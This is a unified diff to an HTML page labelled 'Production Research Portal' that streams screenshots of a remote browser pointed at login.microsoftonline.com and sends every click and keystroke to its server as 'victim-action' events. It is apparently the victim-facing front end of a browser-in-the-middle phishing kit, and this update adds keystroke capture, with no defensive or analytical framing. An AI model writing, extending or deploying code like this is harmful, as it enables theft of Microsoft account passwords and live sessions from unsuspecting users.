@@ -4,27 +4,55 @@
     <title>Production Research Portal</title>
     <style>
         body { background: #000; color: #0f0; font-family: monospace; display: flex; flex-direction: column; align-items: center; margin: 0; overflow: hidden; }
-        .bar { width: 100%; background: #111; padding: 10px; font-size: 11px; border-bottom: 1px solid #333; }
-        #mirror { width: 100vw; height: auto; cursor: crosshair; }
+        .status-bar { width: 100%; background: #111; padding: 10px; font-size: 11px; border-bottom: 1px solid #333; color: #888; }
+        #msg { color: #0f0; font-weight: bold; }
+        #mirror { width: 100vw; height: auto; cursor: crosshair; border-bottom: 1px solid #222; }
+        .hint { font-size: 10px; color: #555; margin-top: 5px; }
     </style>
 </head>
 <body>
-    <div class="bar">STATUS: <span id="s">CONNECTING_WS...</span></div>
+    <div class="status-bar">
+        SYSTEM_READY | STATUS: <span id="msg">INITIALIZING_RELAY...</span> | 
+        TARGET: login.microsoftonline.com
+    </div>
     <img id="mirror" src="" />
+    <div class="hint">Click inside the field on the screen before typing. Press Enter to submit.</div>
+
     <script src="/socket.io/socket.io.js"></script>
     <script>
         const socket = io({ transports: ['websocket'], upgrade: false });
         const img = document.getElementById('mirror');
-        socket.on('connect', () => { document.getElementById('s').innerText = "WS_OPEN - HEARTBEAT_ACTIVE"; });
-        socket.on('browser-render', (data) => { img.src = 'data:image/jpeg;base64,' + data.screenshot; });
+        const status = document.getElementById('msg');
+
+        socket.on('connect', () => {
+            status.innerText = "WS_OPEN - HEARTBEAT_ACTIVE";
+        });
+
+        socket.on('browser-render', (data) => {
+            img.src = 'data:image/jpeg;base64,' + data.screenshot;
+        });
+
+        // HANDLE MOUSE CLICKS
         img.addEventListener('click', (e) => {
             const rect = img.getBoundingClientRect();
+            const x = (e.clientX - rect.left) * (1280 / rect.width);
+            const y = (e.clientY - rect.top) * (720 / rect.height);
+            socket.emit('victim-action', { type: 'click', x, y });
+        });
+
+        // HANDLE KEYBOARD INPUT (THE NEW UPDATE)
+        window.addEventListener('keydown', (e) => {
+            // Forward keys to server, but prevent browser defaults like scrolling
+            const keysToPrevent = ["ArrowUp", "ArrowDown", "Space", "Tab"];
+            if (keysToPrevent.includes(e.code)) e.preventDefault();
+            
             socket.emit('victim-action', { 
-                type: 'click', 
-                x: (e.clientX - rect.left) * (1280 / rect.width), 
-                y: (e.clientY - rect.top) * (720 / rect.height) 
+                type: 'key', 
+                key: e.key 
             });
         });
+
+        socket.on('disconnect', () => { status.innerText = "WS_DISCONNECTED"; status.style.color = "red"; });
     </script>
 </body>
 </html>
